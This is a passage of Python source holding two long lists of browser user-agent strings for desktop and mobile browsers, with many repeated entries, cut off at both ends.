     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']

userAgents = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
